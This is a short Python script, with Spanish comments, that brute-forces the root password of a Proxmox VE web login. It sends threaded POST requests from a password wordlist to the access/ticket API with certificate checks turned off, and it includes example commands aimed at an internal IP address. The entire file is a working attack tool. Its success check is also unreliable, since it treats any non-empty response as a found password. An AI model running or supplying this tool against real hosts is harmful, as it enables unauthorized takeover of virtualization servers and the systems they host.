import requests, argparse
from datetime import datetime
import threading
from time import sleep

global x

def attack(host, line, verbose, timeout):
    if verbose:
        print("[" + str(datetime.now().strftime("%H:%M:%S")) + "] " + "try : " + line.strip())
    payload = "username=root&password=" + line.strip() + "&realm=pam&new-format=1"
    target = "https://" + host + ":8006/api2/extjs/access/ticket"
    requests.packages.urllib3.disable_warnings()
    try:
        out = requests.post(target, data=payload, verify=False, stream=True, timeout=timeout)
        if out.text:
            print('Password is : ' + str(line))
            global x
            x = True
    except Exception as e:
        if verbose:
            print(f"Error: {e}")

def main(host, filepath, verbose, thread, timeout):
    print('Start Attack')
    global x
    x = False
    with open(filepath) as fp:
        cnt = 0
        while True:
            # Lee una línea del archivo
            line = fp.readline().strip()
            if not line:
                break  # Sal del bucle si no hay más líneas
            
            try:
                # Crear y ejecutar hilo para cada intento
                t = threading.Thread(target=attack, args=(host, line, verbose, timeout), daemon=True)
                t.start()
                cnt += 1

                if cnt >= thread:
                    t.join()  # Espera a que los hilos actuales terminen
                    cnt = 0  # Reinicia el contador para el siguiente grupo de hilos
            except KeyboardInterrupt:
                print("\nExit")
                break
            if x:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", help="Proxmox VE target", required=True)
    parser.add_argument("--Password", "-P", help="Password file", required=True)
    parser.add_argument("--verbose", help="Verbose mode", action="store_true")
    parser.add_argument("-T", help='Number of Threads (default=5)')
    parser.add_argument("--timeout", help='Set timeout value (default=1)')
    args = parser.parse_args()

    host = args.target
    filepath = args.Password
    verbose = args.verbose

    thread = int(args.T) if args.T else 5
    timeout = int(args.timeout) if args.timeout else 1

    main(host, filepath, verbose, thread, timeout)

# Script de referencia:
#   https://github.com/0xlildoudou/rootPVE/blob/main/rootPVE.py
# Para ejecutar:
#   python3 Web-Proxmox.py --target <FQDN/IP> --Password <password_list>
# Por ejemplo:
#   python3 AtacarPVE.py --target 172.16.254.9 --Password /usr/share/dict/spanish

